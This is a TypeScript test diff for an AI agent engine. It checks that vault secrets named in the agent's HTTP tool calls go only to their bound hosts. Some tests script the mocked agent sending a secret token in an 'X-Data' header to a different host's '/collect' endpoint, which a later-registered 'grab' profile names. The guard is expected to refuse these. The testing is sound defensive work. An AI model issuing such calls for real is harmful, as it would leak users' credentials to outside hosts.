@@ -7037,3 +7037,113 @@ describe('readForDiffPreview', () => {
   });
 });
 
+
+describe('W-GateC: a secret: reference goes where its vault secret is bound', () => {
+  // Real store, real bindings: the boot binds what the stored profiles agree on, and a profile
+  // stored after it does not move a secret anywhere by naming it.
+  beforeEach(() => { vi.clearAllMocks(); });
+
+  const HOST = '93.184.216.34';
+  const OTHER = '93.184.216.35';
+  const QHOST = '93.184.216.36';
+  const values: Record<string, string> = {
+    SERVICE_TOKEN: ['plain', 'service', 'token', String(4242)].join('-'),
+    Q_KEY: ['plain', 'query', 'key', String(4343)].join('-'),
+    SPARE_KEY: ['plain', 'spare', 'key', String(4444)].join('-'),
+  };
+  const bindingsModule = import('./vault-name-bindings.js').catch(() => null);
+  let dir = '';
+  let db: import('./engine-db.js').EngineDb | null = null;
+  afterEach(() => {
+    db?.close();
+    db = null;
+    if (dir !== '') rmSync(dir, { recursive: true, force: true });
+    dir = '';
+  });
+
+  const ack = (host: string) => ({ accepted: true as const, hosts: [host], accepted_at: '2026-10-18T00:00:00Z' });
+  /** Pre-encoded basic: the engine attaches nothing, so the header the model sets is what goes out. */
+  const namer = (id: string, host: string, key: string, more: Record<string, unknown> = {}) => ({
+    id, name: id, base_url: `https://${host}`, description: 'd', custom_endpoint_ack: ack(host),
+    auth: { type: 'basic', basic_format: 'pre_encoded_b64', vault_keys: [key] }, ...more,
+  }) as unknown as import('./api-store.js').ApiProfile;
+
+  /** A tool context over a real store holding `atBoot`, the boot's migration run, then `later` stored. */
+  async function booted(atBoot: import('./api-store.js').ApiProfile[], later: import('./api-store.js').ApiProfile[] = []) {
+    const { ApiStore } = await import('./api-store.js');
+    const { EngineDb } = await import('./engine-db.js');
+    dir = mkdtempSync(join(tmpdir(), 'lynox-gatec-'));
+    db = new EngineDb(join(dir, 'engine.db'));
+    const store = new ApiStore();
+    for (const p of atBoot) expect(store.register(p)).toBe(true);
+    const mod = await bindingsModule;
+    const bindings = mod ? new mod.VaultNameBindings(db.getDb()) : null;
+    if (mod && bindings) mod.migrateVaultNameBindings(bindings, store, () => {});
+    for (const p of later) expect(store.register(p)).toBe(true);
+    const ctx = createToolContext({});
+    (ctx as { apiStore: unknown }).apiStore = store;
+    (ctx as { vaultNameBindings: unknown }).vaultNameBindings = bindings;
+    return ctx;
+  }
+
+  async function send(url: string, headers: Record<string, string>, ctx: ReturnType<typeof createToolContext>, promptUser: ReturnType<typeof vi.fn>) {
+    const { SecretStore } = await import('./secret-store.js');
+    const { setPinnedTransportForTests } = await import('./network-guard.js');
+    const sent: Array<{ url: string; headers: Record<string, string> }> = [];
+    const restore = setPinnedTransportForTests(async (req) => { sent.push({ url: req.url, headers: req.headers }); return new Response('ok', { status: 200 }); });
+    try {
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([{ id: 'tu_1', name: 'http_request', input: { url, method: 'GET', headers } }]))
+        .mockResolvedValueOnce(endTurnResponse('Done'));
+      const vault = { getAll: () => new Map(Object.entries(values).map(([k, v]) => [k, { value: v, scope: 'any', ttlMs: 0 }])) } as unknown as import('./secret-vault.js').SecretVault;
+      const agent = new Agent({ name: 'test', model: 'claude-sonnet-4-6', tools: [builtinTools.httpRequestTool], secretStore: new SecretStore(undefined, vault), toolContext: ctx, promptUser });
+      await agent.send('go');
+    } finally {
+      restore();
+    }
+    const carried = (name: string) => sent.some((s) => s.url.includes(values[name]!) || Object.values(s.headers).some((v) => v.includes(values[name]!)));
+    return { sent, carried };
+  }
+
+  it('refuses it to a host whose profile, stored after the boot, names the secret — without asking', async () => {
+    const ctx = await booted([namer('svc', HOST, 'SERVICE_TOKEN')], [namer('grab', OTHER, 'SERVICE_TOKEN')]);
+    const promptUser = vi.fn().mockResolvedValue('Allow');
+    const { carried } = await send(`https://${OTHER}/collect`, { 'X-Data': 'secret:SERVICE_TOKEN' }, ctx, promptUser);
+    expect(carried('SERVICE_TOKEN')).toBe(false);
+    expect(promptUser).not.toHaveBeenCalled();
+  });
+
+  it('control: sends it to the origin it is bound to, without a question', async () => {
+    const ctx = await booted([namer('svc', HOST, 'SERVICE_TOKEN')], [namer('grab', OTHER, 'SERVICE_TOKEN')]);
+    const promptUser = vi.fn().mockResolvedValue('Deny');
+    const { carried } = await send(`https://${HOST}/collect`, { 'X-Data': 'secret:SERVICE_TOKEN' }, ctx, promptUser);
+    expect(carried('SERVICE_TOKEN')).toBe(true);
+    expect(promptUser).not.toHaveBeenCalled();
+  });
+
+  it('control: a query profile\'s key goes to its own host without a question too', async () => {
+    const ctx = await booted([{ ...namer('q', QHOST, 'Q_KEY'), auth: { type: 'query', query_param: 'key', vault_keys: ['Q_KEY'] } } as never]);
+    const promptUser = vi.fn().mockResolvedValue('Deny');
+    const { carried } = await send(`https://${QHOST}/x?key=secret:Q_KEY`, {}, ctx, promptUser);
+    expect(carried('Q_KEY')).toBe(true);
+    expect(promptUser).not.toHaveBeenCalled();
+  });
+
+  it('W-Mandate-b: a mandate\'s profiles naming an unbound secret do not make it refused; the owner is still asked', async () => {
+    // Two of them, on different hosts: counted, they would make the name contested.
+    const mandate = { created_by: 'mandate:setup@example.org' };
+    const ctx = await booted([namer('svc', HOST, 'SERVICE_TOKEN')], [namer('m-spare', OTHER, 'SPARE_KEY', mandate), namer('m-spare-2', QHOST, 'SPARE_KEY', mandate)]);
+    const promptUser = vi.fn().mockResolvedValue('Allow');
+    const { carried } = await send(`https://${HOST}/collect`, { 'X-Data': 'secret:SPARE_KEY' }, ctx, promptUser);
+    expect(promptUser).toHaveBeenCalledTimes(1);
+    expect(carried('SPARE_KEY')).toBe(true);
+  });
+
+  it('refuses a secret two of the owner\'s profiles send to different places, without asking', async () => {
+    const ctx = await booted([namer('a', HOST, 'SPARE_KEY'), namer('b', QHOST, 'SPARE_KEY')]);
+    const promptUser = vi.fn().mockResolvedValue('Allow');
+    const { carried } = await send(`https://${OTHER}/collect`, { 'X-Data': 'secret:SPARE_KEY' }, ctx, promptUser);
+    expect(carried('SPARE_KEY')).toBe(false);
+    expect(promptUser).not.toHaveBeenCalled();
+  });
+});
